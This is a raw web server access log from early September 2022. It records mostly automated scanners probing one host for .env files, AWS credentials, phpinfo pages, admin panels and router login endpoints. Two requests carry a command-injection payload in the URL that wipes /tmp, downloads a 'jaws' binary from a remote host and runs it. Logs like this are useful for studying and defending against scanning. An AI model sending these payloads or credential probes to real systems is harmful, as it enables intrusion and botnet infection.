191.183.198.156 - - [04/Sep/2022:12:25:14 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
191.183.198.156 - - [04/Sep/2022:12:25:14 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "http://35.172.128.201/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
191.183.198.156 - - [04/Sep/2022:12:25:20 +0000] "GET /key HTTP/1.1" 200 80 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
191.183.198.156 - - [04/Sep/2022:12:26:05 +0000] "GET /key2 HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
37.76.204.40 - - [04/Sep/2022:12:48:06 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
37.76.204.40 - - [04/Sep/2022:12:48:06 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
37.76.204.40 - - [04/Sep/2022:12:48:06 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
37.76.204.40 - - [04/Sep/2022:12:48:06 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
37.76.204.40 - - [04/Sep/2022:12:48:06 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
37.76.204.40 - - [04/Sep/2022:12:48:06 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
37.76.204.40 - - [04/Sep/2022:12:48:06 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
37.76.204.40 - - [04/Sep/2022:12:48:06 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
37.76.204.40 - - [04/Sep/2022:12:48:06 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
192.241.219.146 - - [04/Sep/2022:13:22:24 +0000] "GET /portal/redlion HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
192.241.212.230 - - [04/Sep/2022:13:49:14 +0000] "GET /actuator/health HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
192.241.218.16 - - [04/Sep/2022:14:29:13 +0000] "GET /hudson HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
185.254.196.115 - - [04/Sep/2022:15:20:09 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [04/Sep/2022:15:20:10 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [04/Sep/2022:16:49:00 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [04/Sep/2022:16:49:01 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.118.39.88 - - [04/Sep/2022:17:02:11 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
23.251.102.74 - - [04/Sep/2022:17:25:02 +0000] "GET /admin/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
141.98.6.162 - - [04/Sep/2022:17:31:27 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
2.57.122.98 - - [04/Sep/2022:18:05:39 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.254.196.115 - - [04/Sep/2022:18:18:27 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [04/Sep/2022:18:18:27 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2.57.122.98 - - [04/Sep/2022:19:20:07 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.254.196.115 - - [04/Sep/2022:19:47:19 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [04/Sep/2022:19:47:19 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.118.39.88 - - [04/Sep/2022:19:50:46 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
205.210.31.35 - - [04/Sep/2022:20:37:53 +0000] "GET / HTTP/1.1" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
2.57.122.98 - - [04/Sep/2022:20:58:25 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.6.162 - - [04/Sep/2022:21:16:11 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.254.196.115 - - [04/Sep/2022:21:18:25 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [04/Sep/2022:21:18:26 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.118.39.88 - - [04/Sep/2022:21:24:50 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
20.249.54.34 - - [04/Sep/2022:21:46:07 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+0.0.0.0/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
2.57.122.98 - - [04/Sep/2022:22:20:36 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
71.6.146.186 - - [04/Sep/2022:22:39:15 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
71.6.146.186 - - [04/Sep/2022:22:39:15 +0000] "GET /robots.txt HTTP/1.1" 404 196 "-" "-"
71.6.146.186 - - [04/Sep/2022:22:39:16 +0000] "GET /sitemap.xml HTTP/1.1" 404 196 "-" "-"
71.6.146.186 - - [04/Sep/2022:22:39:16 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 196 "-" "-"
71.6.146.186 - - [04/Sep/2022:22:39:16 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
130.211.54.158 - - [04/Sep/2022:22:40:15 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
185.254.196.115 - - [04/Sep/2022:22:45:41 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [04/Sep/2022:22:45:42 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.143 - - [04/Sep/2022:22:56:03 +0000] "GET / HTTP/1.0" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.254.196.115 - - [05/Sep/2022:00:18:10 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:00:18:11 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2.57.122.209 - - [05/Sep/2022:01:12:39 +0000] "GET http://example.com/ HTTP/1.1" 200 32 "-" "Go-http-client/1.1"
103.179.0.55 - - [05/Sep/2022:01:30:40 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
79.187.237.233 - - [05/Sep/2022:01:46:24 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:01:48:50 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:01:48:51 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.53.193.139 - - [05/Sep/2022:02:33:45 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
168.232.14.138 - - [05/Sep/2022:02:35:45 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
92.118.39.30 - - [05/Sep/2022:03:10:05 +0000] "GET http://example.com/ HTTP/1.1" 200 32 "-" "Go-http-client/1.1"
185.254.196.115 - - [05/Sep/2022:03:19:20 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:03:19:21 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
35.233.62.116 - - [05/Sep/2022:04:14:21 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
185.216.71.180 - - [05/Sep/2022:04:22:20 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
185.216.71.180 - - [05/Sep/2022:04:22:22 +0000] "POST /debug.cgi HTTP/1.1" 404 196 "-" "python-requests/2.21.0"
185.254.196.115 - - [05/Sep/2022:04:48:25 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:04:48:25 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
71.6.232.5 - - [05/Sep/2022:04:56:23 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
128.14.134.134 - - [05/Sep/2022:06:19:33 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:06:20:33 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:06:20:34 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.138.4.132 - - [05/Sep/2022:07:30:00 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
162.220.165.123 - - [05/Sep/2022:07:40:31 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://35.172.128.201:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.254.196.115 - - [05/Sep/2022:07:47:14 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:07:47:14 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
94.102.61.10 - - [05/Sep/2022:08:01:31 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
198.235.24.148 - - [05/Sep/2022:08:03:09 +0000] "\x16\x03\x01" 400 226 "-" "-"
5.188.210.227 - - [05/Sep/2022:08:24:13 +0000] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 16 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
43.225.171.36 - - [05/Sep/2022:08:45:16 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:09:17:03 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:09:17:04 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
65.49.20.67 - - [05/Sep/2022:10:04:37 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
65.49.20.107 - - [05/Sep/2022:10:08:58 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
118.69.60.229 - - [05/Sep/2022:10:13:01 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+networkmapping.xyz/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
185.254.196.115 - - [05/Sep/2022:10:52:08 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:10:52:09 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2.57.122.98 - - [05/Sep/2022:11:06:24 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.216.71.242 - - [05/Sep/2022:11:46:57 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
185.216.71.242 - - [05/Sep/2022:11:46:57 +0000] "POST /HNAP1/ HTTP/1.1" 404 196 "-" "Mozila/5.0"
135.125.217.54 - - [05/Sep/2022:11:50:16 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [05/Sep/2022:11:50:16 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:12:19:48 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:12:19:50 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.65.200.168 - - [05/Sep/2022:12:23:48 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
128.14.133.58 - - [05/Sep/2022:12:30:10 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
46.117.108.113 - - [05/Sep/2022:12:34:57 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
177.251.145.235 - - [05/Sep/2022:13:00:48 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
135.125.217.54 - - [05/Sep/2022:13:21:43 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [05/Sep/2022:13:21:43 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.62.73.140 - - [05/Sep/2022:13:50:20 +0000] "\x16\x03\x01" 400 226 "-" "-"
178.62.73.140 - - [05/Sep/2022:13:50:20 +0000] "\x16\x03\x01" 400 226 "-" "-"
178.62.73.140 - - [05/Sep/2022:13:50:20 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 zgrab/0.x"
185.254.196.115 - - [05/Sep/2022:13:53:36 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:13:53:38 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:15:21:22 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:15:21:22 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2.57.122.98 - - [05/Sep/2022:15:33:23 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.118.39.88 - - [05/Sep/2022:15:42:24 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
192.241.197.236 - - [05/Sep/2022:16:03:49 +0000] "GET /manager/text/list HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
95.161.131.237 - - [05/Sep/2022:16:25:59 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 zgrab/0.x"
120.86.238.97 - - [05/Sep/2022:16:47:43 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 196 "-" "Hello, World"
185.254.196.115 - - [05/Sep/2022:16:48:01 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:16:48:01 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.207.74 - - [05/Sep/2022:16:48:37 +0000] "GET /manager/html HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
2.57.122.98 - - [05/Sep/2022:17:06:19 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
2.57.122.98 - - [05/Sep/2022:17:22:28 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
129.232.191.10 - - [05/Sep/2022:17:58:38 +0000] "GET /admin/config.php HTTP/1.1\n" 400 226 "-" "-"
162.220.165.123 - - [05/Sep/2022:17:58:48 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://35.172.128.201:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
92.118.39.88 - - [05/Sep/2022:18:15:37 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
185.254.196.115 - - [05/Sep/2022:18:15:39 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:18:15:40 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /phpinfo.php HTTP/1.1" 404 16 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /phpinfo HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /aws.yml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /.env.bak HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /info.php HTTP/1.1" 404 16 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /.aws/credentials HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /config/aws.yml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /config.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
